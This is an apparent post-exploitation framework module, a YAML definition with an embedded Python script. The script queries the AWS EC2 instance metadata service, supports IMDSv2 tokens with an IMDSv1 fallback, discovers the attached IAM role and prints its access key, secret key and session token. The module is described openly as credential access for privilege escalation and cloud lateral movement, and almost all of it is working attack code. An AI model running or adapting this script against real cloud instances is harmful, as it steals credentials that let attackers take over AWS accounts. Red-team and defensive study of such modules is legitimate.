name: aws_imds
authors:
  - name: Anthony Rose
    handle: '@Cx01N'
    link: https://twitter.com/Cx01N_
description: |
  Queries the AWS EC2 Instance Metadata Service (IMDS) to retrieve temporary
  IAM role credentials from an attached instance profile. Supports IMDSv2
  token-based access and IMDSv1 direct metadata requests with automatic
  detection or operator-selected version mode. Works on EC2 instances with an
  IAM role attached and collects role credentials alongside instance metadata
  context. Retrieved credentials can be used for AWS API access, privilege
  escalation paths, and cloud lateral movement in post-exploitation workflows.
software: ''
tactics: [TA0006]
techniques: [T1552.005]
background: false
output_extension: ''
needs_admin: false
opsec_safe: true
language: python
min_language_version: '2.6'
comments:
  - https://docs.aws.amazon.com/IMDS/latest/userguide/
  - https://attack.mitre.org/techniques/T1552/005/
options:
  - name: Agent
    description: Agent to run module on.
    required: true
    value: ''
  - name: Endpoint
    description: IMDS endpoint address.
    required: false
    value: '169.254.169.254'
  - name: Version
    description: IMDS version to use.
    required: false
    value: 'auto'
    suggested_values:
      - auto
      - v1
      - v2
  - name: RoleName
    description: IAM role name (auto-discovers if empty).
    required: false
    value: ''
script: |
  import json
  import urllib.error
  import urllib.request

  endpoint = '{{ Endpoint }}'.strip() or '169.254.169.254'
  version = '{{ Version }}'.strip().lower() or 'auto'
  role_name = '{{ RoleName }}'.strip()

  timeout = 2
  base_url = 'http://{0}'.format(endpoint)
  token = None
  token_error = None
  continue_execution = True

  if version not in ('auto', 'v1', 'v2'):
      print('[!] Invalid Version option: {0}. Use auto, v1, or v2.'.format(version))
      continue_execution = False

  if continue_execution and version in ('auto', 'v2'):
      token_url = '{0}/latest/api/token'.format(base_url)
      token_request = urllib.request.Request(token_url, method='PUT')
      token_request.add_header('X-aws-ec2-metadata-token-ttl-seconds', '21600')
      try:
          with urllib.request.urlopen(token_request, timeout=timeout) as response:
              token = response.read().decode('utf-8').strip()
      except Exception as exc:
          token_error = str(exc)
          if version == 'v2':
              print('[!] IMDSv2 token request failed: {0}'.format(token_error))
              print('[!] Ensure this host is EC2 and IMDS is reachable/enabled.')
              continue_execution = False

  if continue_execution:
      headers = {}
      if token:
          headers['X-aws-ec2-metadata-token'] = token
          imds_mode = 'v2'
      else:
          imds_mode = 'v1'
          if version == 'auto' and token_error:
              print('[*] IMDSv2 unavailable, falling back to IMDSv1: {0}'.format(token_error))

      instance_id = 'unknown'
      account_id = 'unknown'
      region = 'unknown'

      instance_id_url = '{0}/latest/meta-data/instance-id'.format(base_url)
      instance_id_request = urllib.request.Request(instance_id_url, headers=headers)
      try:
          with urllib.request.urlopen(instance_id_request, timeout=timeout) as response:
              instance_id = response.read().decode('utf-8').strip()
      except Exception as exc:
          print('[!] Unable to retrieve instance ID from IMDS: {0}'.format(exc))

      identity_url = '{0}/latest/dynamic/instance-identity/document'.format(base_url)
      identity_request = urllib.request.Request(identity_url, headers=headers)
      try:
          with urllib.request.urlopen(identity_request, timeout=timeout) as response:
              identity_data = json.loads(response.read().decode('utf-8'))
              account_id = identity_data.get('accountId', account_id)
              region = identity_data.get('region', region)
              instance_id = identity_data.get('instanceId', instance_id)
      except Exception as exc:
          print('[!] Unable to retrieve identity document: {0}'.format(exc))

      if not role_name:
          role_url = '{0}/latest/meta-data/iam/security-credentials/'.format(base_url)
          role_request = urllib.request.Request(role_url, headers=headers)
          try:
              with urllib.request.urlopen(role_request, timeout=timeout) as response:
                  role_list = response.read().decode('utf-8').strip()
                  if role_list:
                      role_name = role_list.splitlines()[0].strip()
                  else:
                      print('[!] No IAM role attached to this instance profile.')
          except urllib.error.HTTPError as exc:
              if exc.code == 404:
                  print('[!] IAM metadata endpoint not found. No role attached or IMDS restricted.')
              elif exc.code == 401:
                  print('[!] Unauthorized metadata request. IMDSv2 token may be required.')
              else:
                  print('[!] Failed to discover IAM role name: HTTP {0}'.format(exc.code))
          except Exception as exc:
              print('[!] Failed to discover IAM role name: {0}'.format(exc))

      if role_name:
          creds_url = '{0}/latest/meta-data/iam/security-credentials/{1}'.format(base_url, role_name)
          creds_request = urllib.request.Request(creds_url, headers=headers)
          try:
              with urllib.request.urlopen(creds_request, timeout=timeout) as response:
                  creds_raw = response.read().decode('utf-8')

              try:
                  creds = json.loads(creds_raw)
                  print('[+] Successfully queried AWS IMDS ({0})'.format(imds_mode))
                  print('[+] Endpoint: {0}'.format(endpoint))
                  print('[+] InstanceId: {0}'.format(instance_id))
                  print('[+] AccountId: {0}'.format(account_id))
                  print('[+] Region: {0}'.format(region))
                  print('[+] RoleName: {0}'.format(role_name))
                  print('[+] AccessKeyId: {0}'.format(creds.get('AccessKeyId', '')))
                  print('[+] SecretAccessKey: {0}'.format(creds.get('SecretAccessKey', '')))
                  print('[+] Token: {0}'.format(creds.get('Token', creds.get('SessionToken', ''))))
                  print('[+] Expiration: {0}'.format(creds.get('Expiration', '')))
              except Exception:
                  print('[*] Credential response was not valid JSON. Raw output follows:')
                  print(creds_raw)
          except urllib.error.HTTPError as exc:
              if exc.code == 404:
                  print('[!] IAM credentials endpoint not found for role: {0}'.format(role_name))
              elif exc.code == 401:
                  print('[!] Unauthorized when requesting credentials. IMDSv2 token may be required.')
              else:
                  print('[!] Failed to retrieve credentials: HTTP {0}'.format(exc.code))
          except Exception as exc:
              print('[!] Failed to retrieve credentials from IMDS: {0}'.format(exc))
      else:
          print('[!] Could not determine IAM role name. No credentials retrieved.')
